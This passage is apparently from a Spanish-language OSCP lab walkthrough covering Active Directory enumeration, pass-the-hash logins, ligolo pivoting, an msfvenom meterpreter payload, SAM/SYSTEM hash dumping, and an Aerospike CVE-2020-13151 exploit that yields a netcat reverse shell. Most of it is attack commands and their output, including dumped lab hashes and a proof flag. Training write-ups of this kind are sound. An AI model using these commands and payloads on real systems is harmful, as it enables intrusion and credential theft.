| Tom Admin           | tom\_admin                    | [tom\_admin@oscp.exam](mailto:tom_admin@oscp.exam)          | Users      | 0              | 12/31/1600 4:00:00 PM  |
| Leonard Morris      | Leonard.Morris                | [Leonard.Morris@oscp.exam](mailto:Leonard.Morris@oscp.exam) | OU=admin   | 0              | 12/31/1600 4:00:00 PM  |
| Sandra Craig        | Sandra.Craig                  | [Sandra.Craig@oscp.exam](mailto:Sandra.Craig@oscp.exam)     | OU=admin   | 0              | 12/31/1600 4:00:00 PM  |
| Chelsea Byrne       | Chelsea.Byrne                 | [Chelsea.Byrne@oscp.exam](mailto:Chelsea.Byrne@oscp.exam)   | OU=admin   | 0              | 12/31/1600 4:00:00 PM  |
| Luke Martin         | Luke.Martin                   | [Luke.Martin@oscp.exam](mailto:Luke.Martin@oscp.exam)       | OU=admin   | 0              | 12/31/1600 4:00:00 PM  |
| Donna Johnson       | Donna.Johnson                 | [Donna.Johnson@oscp.exam](mailto:Donna.Johnson@oscp.exam)   | OU=admin   | 0              | 12/31/1600 4:00:00 PM  |
| Lawrence Kay        | Lawrence.Kay                  | [Lawrence.Kay@oscp.exam](mailto:Lawrence.Kay@oscp.exam)     | OU=finance | 0              | 12/31/1600 4:00:00 PM  |
| Emily Bishop        | Emily.Bishop                  | [Emily.Bishop@oscp.exam](mailto:Emily.Bishop@oscp.exam)     | OU=finance | 0              | 12/31/1600 4:00:00 PM  |
| Linda Patel         | Linda.Patel                   | [Linda.Patel@oscp.exam](mailto:Linda.Patel@oscp.exam)       | OU=finance | 0              | 12/31/1600 4:00:00 PM  |
| Jamie Thomas        | Jamie.Thomas                  | [Jamie.Thomas@oscp.exam](mailto:Jamie.Thomas@oscp.exam)     | OU=finance | 0              | 12/31/1600 4:00:00 PM  |


**Usuarios con credenciales **

```powershell
Get-DomainUser -Identity celia.almeda


logoncount            : 30
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Celia Almeda,CN=Users,DC=oscp,DC=exam
objectclass           : {top, person, organizationalPerson, user}
displayname           : Celia Almeda
lastlogontimestamp    : 8/2/2025 6:51:48 AM
userprincipalname     : celia.almeda@oscp.exam
name                  : Celia Almeda
objectsid             : S-1-5-21-2610934713-1581164095-2706428072-1105
samaccountname        : celia.almeda
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
cn                    : Celia Almeda
whenchanged           : 8/2/2025 1:51:48 PM
instancetype          : 4
usncreated            : 16605
objectguid            : a6ee12df-4814-43cc-9439-5b2620606723
sn                    : Almeda
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : Celia
lastlogon             : 8/2/2025 6:51:48 AM
badpwdcount           : 0
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 4/1/2022 4:25:03 PM
countrycode           : 0
primarygroupid        : 513
pwdlastset            : 4/1/2022 9:25:03 AM
usnchanged            : 106595

```

**Grupos**
```powershell
Get-DomainGroup | Select-Object -ExpandProperty Name                                                                                                                                                              
Administrators                                                                                                                                                                                                    
Users                                                                                                                                                                                                             
Guests                                                                                                                                                                                                            
Print Operators                                                                                                                                                                                                   
Backup Operators                                                                                                                                                                                                  
Replicator                                                                                                                                                                                                        
Remote Desktop Users                                                                                                                                                                                              
Network Configuration Operators                                                                                                                                                                                   
Performance Monitor Users                                                                                                                                                                                         
Performance Log Users                                                                                                                                                                                             
Distributed COM Users                                                                                                                                                                                             
IIS_IUSRS                                                                                                                                                                                                         
Cryptographic Operators                                                                                                                                                                                           
Event Log Readers                                                                                                                                                                                                 
Certificate Service DCOM Access                                                                                                                                                                                   
RDS Remote Access Servers                                                                                                                                                                                         
RDS Endpoint Servers                                                                                                                                                                                              
RDS Management Servers                                                                                                                                                                                            
Hyper-V Administrators                                                                                                                                                                                            
Access Control Assistance Operators                                                                                                                                                                               
Remote Management Users                                                                                                                                                                                           
Storage Replica Administrators                                                                                                                                                                                    
Domain Computers                                                                                                                                                                                                  
Domain Controllers                                                                                                                                                                                                
Schema Admins                                                                                                                                                                                                     
Enterprise Admins                                                                                                                                                                                                 
Cert Publishers                                                                                                                                                                                                   
Domain Admins                                                                                                                                                                                                     
Domain Users                                                                                                                                                                                                      
Domain Guests                                                                                                                                                                                                     
Group Policy Creator Owners                                                                                                                                                                                       
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
admin
finance
hr
IT
marketing
```

### 🛠️ Usuarios con SPN

| **Nombre** | **Username (samAccountName)** | **Display Name** | **Email (UPN)**                                | **SPN**                | **Last Logon**        | **Pwd Last Set**       | **UAC Flags**                           | **Logon Count** |
| ---------- | ----------------------------- | ---------------- | ---------------------------------------------- | ---------------------- | --------------------- | ---------------------- | --------------------------------------- | --------------- |
| krbtgt     | krbtgt                        | –                | –                                              | `kadmin/changepw`      | 12/31/1600 4:00:00 PM | 3/25/2022 7:43:58 AM   | ACCOUNTDISABLE, NORMAL\_ACCOUNT         | 0               |
| sql\_svc   | sql\_svc                      | sql\_svc         | [sql\_svc@oscp.exam](mailto:sql_svc@oscp.exam) | `MSSQL/MS02.oscp.exam` | 11/10/2022 3:15:51 AM | 12/5/2022 5:49:44 AM   | NORMAL\_ACCOUNT, DONT\_EXPIRE\_PASSWORD | 1               |
| web\_svc   | web\_svc                      | web\_svc         | [web\_svc@oscp.exam](mailto:web_svc@oscp.exam) | `HTTP/MS01.oscp.exam`  | 11/14/2022 6:29:47 AM | 11/10/2022 11:11:19 PM | NORMAL\_ACCOUNT, DONT\_EXPIRE\_PASSWORD | 9               |


* **Generamos el tunnel con ligolo**

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/AD-Machines/Internal]
└─# crackmapexec smb 10.10.84.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam --shares
SMB         10.10.84.142    445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         10.10.84.142    445    MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 
SMB         10.10.84.142    445    MS02             [+] Enumerated shares
SMB         10.10.84.142    445    MS02             Share           Permissions     Remark
SMB         10.10.84.142    445    MS02             -----           -----------     ------
SMB         10.10.84.142    445    MS02             ADMIN$                          Remote Admin
SMB         10.10.84.142    445    MS02             C$                              Default share
SMB         10.10.84.142    445    MS02             IPC$            READ            Remote IPC

┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/AD-Machines/Internal]
└─# crackmapexec smb 10.10.84.140 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam --shares
SMB         10.10.84.140    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         10.10.84.140    445    DC01             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 
SMB         10.10.84.140    445    DC01             [+] Enumerated shares
SMB         10.10.84.140    445    DC01             Share           Permissions     Remark
SMB         10.10.84.140    445    DC01             -----           -----------     ------
SMB         10.10.84.140    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.84.140    445    DC01             C$                              Default share
SMB         10.10.84.140    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.84.140    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.84.140    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.84.140    445    DC01             Users           READ 
```

#### Enumeracion Red interna:

### 🖥️ 10.10.172.140 (DC01) - Controlador de Dominio

| Puerto | Servicio         | Descripción                                | Posibles Vectores                                                                 |
| ------ | ---------------- | ------------------------------------------ | --------------------------------------------------------------------------------- |
| 53     | DNS (Simple DNS) | Resolución de nombres                      | DNS zone transfer (`dig axfr`), spoofing, tunneling (DNSCat2)                     |
| 88     | Kerberos         | Autenticación AD                           | AS-REP Roasting, Kerberoasting, Pass-the-Ticket, brute-force con usuarios válidos |
| 135    | MSRPC            | RPC / DCOM                                 | Enumeración de servicios, DCOM lateral movement                                   |
| 139    | NetBIOS-SSN      | Compartición antigua                       | Enumeración de usuarios/grupos (con `enum4linux`, `smbclient`)                    |
| 389    | LDAP             | Active Directory                           | Enumeración AD anónima, LDAP injection, ataques sobre objetos                     |
| 445    | SMB              | Compartición de archivos                   | Null sessions, SMB relay, enumeración de shares, Pass-the-Hash                    |
| 464    | Kpasswd          | Cambiar contraseñas Kerberos               | Ataques de diccionario, enumeración de usuarios válidos                           |
| 593    | RPC over HTTP    | DCOM sobre HTTP                            | DCOM + NTLM relay, explotación vía Outlook (si expuesto)                          |
| 636    | LDAPS            | LDAP cifrado                               | Enumeración segura si hay acceso                                                  |
| 3268   | LDAP GC          | Global Catalog para búsqueda en todo el AD | Enumeración de objetos AD                                                         |
| 3269   | LDAPS GC         | Global Catalog sobre SSL                   | Igual que 3268 pero cifrado                                                       |
| 5985   | WinRM            | Administración remota (HTTPAPI)            | Ataques con credenciales válidas (Evil-WinRM, CME, RCE vía PSRemoting)            |



### 🖥️ 10.10.172.142 (MS02) - Servidor SQL / Windows

| Puerto | Servicio      | Descripción               | Posibles Vectores                                                               |
| ------ | ------------- | ------------------------- | ------------------------------------------------------------------------------- |
| 135    | MSRPC         | RPC / DCOM                | Lateral movement, enumeración local                                             |
| 139    | NetBIOS-SSN   | Compartición antigua      | Enumeración de NetBIOS                                                          |
| 445    | SMB           | Compartición de archivos  | Enumeración de shares, `null sessions`, Pass-the-Hash                           |
| 1433   | MS SQL Server | Microsoft SQL Server 2019 | SQLi, autenticación débil (`sa` sin pass), xp\_cmdshell, lateral movement       |
|        |               |                           | Enumerar usuarios con `mssqlclient.py` (Impacket), cracking con `hydra`, `nmap` |
| 5985   | WinRM         | Administración remota     | RCE con credenciales válidas (Evil-WinRM, CME)                                  |

#### Ingresamos con el hash de celia.almeda a .142

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/4_OSCP-A/AD-Machines]
└─# evil-winrm -i 10.10.172.142 -u 'celia.almeda' -H e728ecbadfb02f51ce8eed753f3ff3fd -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\celia.almeda S-1-5-21-2610934713-1581164095-2706428072-1105


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

> Generer ** Rreverse Port Forwarding **

[https://exploit-notes.hdks.org/exploit/network/port-forwarding/chisel/](Reverse Port Forgarding Chisel)

[https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5](Port forwarding ligolo)

** kali => MS01 => MS02** y **kali <= MS01 <= MS02** 

#### Configuraciones de red en MS01 y MS02:

**MS01**

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> ipconfig
                                                                                                                                                                                                                  
Windows IP Configuration                                                                                                                                                                                          
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Ethernet adapter Ethernet0:                                                                                                                                                                                       
                                                                                                                                                                                                                  
   Connection-specific DNS Suffix  . :                                                                                                                                                                            
   IPv4 Address. . . . . . . . . . . : 192.168.128.141                                                                                                                                                            
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                                                                                                              
   Default Gateway . . . . . . . . . : 192.168.128.254                                                                                                                                                            
                                                                                                                                                                                                                  
Ethernet adapter Ethernet1:                                                                                                                                                                                       
                                                                                                                                                                                                                  
   Connection-specific DNS Suffix  . :                                                                                                                                                                            
   IPv4 Address. . . . . . . . . . . : 10.10.88.141  <-- apuntar a esta ip para hacer ping desde MS02 a MS01
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                                                                                                              
   Default Gateway . . . . . . . . . :                                                                                                                                                                            
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> ping 10.10.88.142
                                                                                                                                                                                                                  
Pinging 10.10.88.142 with 32 bytes of data:                                                                                                                                                                       
Reply from 10.10.88.142: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.142: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.142: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.142: bytes=32 time<1ms TTL=128                                                                                                                                                                
                                                                                                                                                                                                                  
Ping statistics for 10.10.88.142:                                                                                                                                                                                 
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),                                                                                                                                                          
Approximate round trip times in milli-seconds:                                                                                                                                                                    
    Minimum = 0ms, Maximum = 0ms, Average = 0ms                                                                                                                                                                   
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> 
```

**MS02**

```powershell
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.88.142
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.88.254
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> ping 10.10.88.141
                                                                                                                                                                                                                  
Pinging 10.10.88.141 with 32 bytes of data:                                                                                                                                                                       
Reply from 10.10.88.141: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.141: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.141: bytes=32 time<1ms TTL=128                                                                                                                                                                
Reply from 10.10.88.141: bytes=32 time<1ms TTL=128                                                                                                                                                                
                                                                                                                                                                                                                  
Ping statistics for 10.10.88.141:                                                                                                                                                                                 
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),                                                                                                                                                          
Approximate round trip times in milli-seconds:                                                                                                                                                                    
    Minimum = 0ms, Maximum = 0ms, Average = 0ms                                                                                                                                                                   
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> 

```

#### Settings para configurar el trafico en de forma bidireccional:

1. Agregamos **listener** a la session de eric.wallows

```bash
listener_add --addr 10.10.88.141:11602 --to 192.168.45.152:9999 --tcp
```

> Ahora podemos levantar un servidor en kali en el puerto 9999 y transferir archivos


2. Agregamos otro listener para la session meterpreter

```bash
listener_add --addr 10.10.88.141:4444 --to 192.168.45.152:4444 --tcp
```

3. Generamos el payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.88.141 LPORT=4444 -f exe -o met.exe
```

4. Levantamos el servidor: `python3 -m http.server 9999`

5. Obtenemos el archivo desde **MS02**

```powershell
iwr -uri http://10.10.88.141:9999/met.exe -Outfile met.exe
```

#### Encontramos windows.old

```powershell
*Evil-WinRM* PS C:\> cd windows.old
*Evil-WinRM* PS C:\windows.old> dir
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\windows.old                                                                                                                                                                                     
                                                                                                                                                                                                                  

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/23/2022   3:01 PM                PerfLogs
d-----          4/4/2022   6:19 AM                Program Files
d-----          4/4/2022   6:20 AM                Program Files (x86)
d-----         3/23/2022   3:01 PM                Recovery
d-----         3/23/2022   3:01 PM                Users
d-----          4/4/2022   6:02 AM                Windows


*Evil-WinRM* PS C:\windows.old\Windows\System32> dir

    Directory: C:\windows.old\Windows\System32

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                AppLocker
d-----          4/4/2022   6:03 AM                Boot
d---s-          4/4/2022   6:03 AM                Configuration
d-----          4/4/2022   6:03 AM                DriverState
d-----          4/4/2022   6:03 AM                DriverStore
d-----          4/4/2022   6:04 AM                en-US
d---s-          4/4/2022   6:06 AM                Microsoft
-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
-a----         12/7/2019   1:09 AM           8977 ResPriImageList
-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
-a----         3/25/2022   1:34 PM         230400 WorkFoldersShell.dll
-a----         3/25/2022   1:34 PM        2229576 workfolderssvc.dll
-a----         3/25/2022   1:31 PM         283648 wosc.dll
-a----         3/25/2022   1:32 PM         352816 wow64.dll
-a----         3/25/2022   1:32 PM          21288 wow64cpu.dll
-a----         3/25/2022   1:32 PM         531984 wow64win.dll
-a----         3/25/2022   1:33 PM          17920 wowreg32.exe
-a----         3/25/2022   1:31 PM         452608 WpAXHolder.dll
-a----         12/7/2019   1:08 AM         103424 wpbcreds.dll
-a----         3/25/2022   1:31 PM        1643008 Wpc.dll
-a----         3/25/2022   1:31 PM         336896 WpcApi.dll
-a----         12/7/2019   1:08 AM          10143 wpcatltoast.png
-a----         3/25/2022   1:31 PM        1867264 WpcDesktopMonSvc.dll
-a----         3/25/2022   1:31 PM        1173472 WpcMon.exe
-a----         12/7/2019   1:08 AM           4687 wpcmon.png
-a----        11/18/2020   6:48 PM          40448 WpcProxyStubs.dll
-a----         3/25/2022   1:34 PM          91648 WwanRadioManager.dll
-a----         3/25/2022   1:31 PM        1518080 wwansvc.dll
-a----        11/18/2020   6:48 PM          97600 wwapi.dll
-a----         3/25/2022   1:31 PM         233984 XamlTileRender.dll
-a----         12/7/2019   1:08 AM           3584 XAudio2_8.dll
-a----         3/25/2022   1:31 PM         623616 XAudio2_9.dll
-a----         3/25/2022   1:31 PM        1049088 XblAuthManager.dll
-a----         3/25/2022   1:31 PM          93696 XblAuthManagerProxy.dll
-a----         3/25/2022   1:31 PM         114688 XblAuthTokenBrokerExt.dll
-a----         3/25/2022   1:31 PM        1270272 XblGameSave.dll
-a----         12/7/2019   1:08 AM         159744 XblGameSaveExt.dll
-a----         12/7/2019   1:08 AM          39936 XblGameSaveProxy.dll
-a----        11/18/2020   6:48 PM          33792 XblGameSaveTask.exe
-a----         12/7/2019   1:08 AM            627 X_80.contrast-black.png
-a----         12/7/2019   1:08 AM            579 X_80.contrast-white.png
-a----         12/7/2019   1:08 AM            627 X_80.png


*Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM
                                        
Info: Downloading C:\windows.old\Windows\System32\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM
                                        
Info: Downloading C:\windows.old\Windows\System32\SYSTEM to SYSTEM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows.old\Windows\System32>
```
#### En kali con impacket-secretsdump:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/AD-Machines/Internal]
└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL                                                                               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 

```

#### Obtenemos el flag:

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/AD-Machines/Internal]
└─# evil-winrm -i 10.10.127.140 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tom_admin\Documents> dir
*Evil-WinRM* PS C:\Users\tom_admin\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/9/2025   6:26 AM             34 proof.txt


*Evil-WinRM* PS C:\Users\tom_admin\Documents> type C:\Users\Administrator\Desktop\proof.txt
dffa7e893f3e2ed86927bfa314b83846
```

------------------

## .143 Aero

### Informacion completa del host ordenada:

| Puerto   | Estado | Servicio   | Versión / Detalles                                                                                                                                                                                                                                             |
| -------- | ------ | ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 21/tcp   | open   | ftp        | vsftpd 3.0.3                                                                                                                                                                                                                                                   |
| 22/tcp   | open   | ssh        | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocolo 2.0) <br>RSA: 23:4c:6f\:ff\:b8:52:29:65:3d\:d1:4e:38\:eb\:fe:01\:c1 <br>ECDSA: 0d\:fd:36\:d8:05:69:83\:ef\:ae\:a0\:fe:4b:82:03:32\:ed <br>ED25519: cc:76:17:1e:8e\:c5:57\:b2:1f:45:28:09:05:5a\:eb:39 |
| 80/tcp   | open   | http       | Apache httpd 2.4.41 ((Ubuntu)) <br>Title: Apache2 Ubuntu Default Page: It works                                                                                                                                                                                |
| 81/tcp   | open   | http       | Apache httpd 2.4.41 ((Ubuntu)) <br>Title: Test Page for the Nginx HTTP Server on Fedora                                                                                                                                                                        |
| 443/tcp  | open   | http       | Apache httpd 2.4.41 ((Ubuntu)) <br>Title: Apache2 Ubuntu Default Page: It works                                                                                                                                                                                |
| 3000/tcp | open   | ppp?       | Servicio no identificado                                                                                                                                                                                                                                       |
| 3001/tcp | open   | nessus?    | Posible comunicación interna de otro servicio                                                                                                                                                                                                                  |
| 3003/tcp | open   | cgms?      | Servicio no identificado, devuelve solo salto de línea                                                                                                                                                                                                         |
| 3306/tcp | open   | mysql      | MySQL (sin autorización)                                                                                                                                                                                                                                       |
| 5432/tcp | open   | postgresql | PostgreSQL 12.9 - 12.13 <br>Certificado SSL: CN=aero, SAN=DNS\:aero <br>Válido 2021-05-10 a 2031-05-08                                                                                                                                                         |

> Con una busqueda rapida en google encontramos lo siguiente

```
Port 3000 is typically used for application services, port 3001 is designated for intra-cluster communication, 
and port 3003 is often used for info commands in systems like Aerospike. 
These ports facilitate various network services and communication between applications and servers
```
Segun el resultado de nmap, particularmente el CN=aero y SAN=DNS\:aero y adicionalmente los puertos abiertos 3000, 3001, 3003 
son indicios de **Aero**spike
* Buscamos con searchsploit posibles exploits para **aero**

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/143]
└─# searchsploit "aero"    
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Aero CMS v0.0.1 - PHP Code Injection (auth)                                                                                                                                     | php/webapps/51085.txt
Aero CMS v0.0.1 - SQL Injection (no auth)                                                                                                                                       | php/webapps/51083.txt
Aero CMS v0.0.1 - SQLi                                                                                                                                                          | php/webapps/51022.txt
Aerohive HiveOS 5.1r5 < 6.1r5 - Multiple Vulnerabilities                                                                                                                        | php/webapps/34038.txt
Aerohive HiveOS 5.1r5 < 6.1r5 - Remote Code Execution                                                                                                                           | hardware/webapps/42178.py
Aerospike Database 5.1.0.3 - OS Command Execution                                                                                                                               | multiple/remote/49067.py
Extreme Networks Aerohive HiveOS 11.0 - Remote Denial of Service (PoC)                                                                                                          | hardware/dos/48441.sh
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results				
```

* Exploramos el exploit: [https://www.exploit-db.com/exploits/49067](Aerospike-exploit)

```bash
┌──(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/143]
└─# searchsploit -m 49067
  Exploit: Aerospike Database 5.1.0.3 - OS Command Execution
      URL: https://www.exploit-db.com/exploits/49067
     Path: /usr/share/exploitdb/exploits/multiple/remote/49067.py
    Codes: CVE-2020-13151
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/OffSec/Challenges/4_OSCP-A/Standalone-Machines/143/49067.py
```
_Al explorar el script observamos tambien que el OS al que el exploit apunta es Ubuntu 18.04_

> Para ejecutar el exploit hay que instalar el modulo de python aerospike desde un entorno virtual _ver notas **Utils**_

- Al ejecutar el exploit obtenemos la version de aerospike, confirmando que esta en ejecucion.

```bash
┌──(aerospike-env)─(root㉿kali)-[/home/…/Challenges/4_OSCP-A/Standalone-Machines/143]
└─# python 49067.py --ahost 192.168.116.143 --netcatshell --lhost 192.168.45.152 --lport 4444
[+] aerospike build info: 5.1.0.1

[-] this instance is patched.

```
Esto basicamente significa que debemos cambiar la version dentro del exploit en la siguiente linea:

```bash
# cambiar
def _is_vuln(_mj, _mi, _pt, _bd):
	fixed = [5,1,0,1]
	found = [_mj, _mi, _pt, _bd]
# por
def _is_vuln(_mj, _mi, _pt, _bd):
	fixed = [5,1,0,3]
	found = [_mj, _mi, _pt, _bd]
```
Pero para ejecutar el exploit debemos tener los archivos correspondientes: Clonamos el siguiente [https://github.com/b4ny4n/CVE-2020-13151/tree/master](repo) que ya tiene esa linea

y ejecutamos:

```bash
┌──(aerospike-env)─(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# python3 cve2020-13151.py --ahost 192.168.116.143 --cmd whoami
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote PNSRcEOYwxXCfXHX
[+] registering udf
[+] issuing command "whoami"
aero

┌──(aerospike-env)─(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# python3 cve2020-13151.py --ahost 192.168.116.143 --cmd id                                         
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote flAqSCRZTnTowxVL
[+] registering udf
[+] issuing command "id"
uid=1000(aero) gid=1000(aero) groups=1000(aero)
```

* Obtenemos un reverse shell:

1. Receptor:

```bash
┌──(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# nc -lvnp 80                            
listening on [any] 80 ...
```

2. Ejecutamos el script:

```bash
┌──(aerospike-env)─(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# python3 cve2020-13151.py --ahost 192.168.249.143 --netcatshell --lhost 192.168.45.152 --lport 80                                                                        
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote FoCtVUglfgXsIMuq
[+] registering udf
[+] sending payload, make sure you have a listener on 192.168.45.152:80.....
```
* En el receptor:

```bash
┌──(root㉿kali)-[/home/…/4_OSCP-A/Standalone-Machines/143/CVE-2020-13151]
└─# nc -lvnp 80                            
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.249.143] 54160
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Elevamos Privilegios:

```bash
$ find / -perm -4000 2>/dev/null 
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
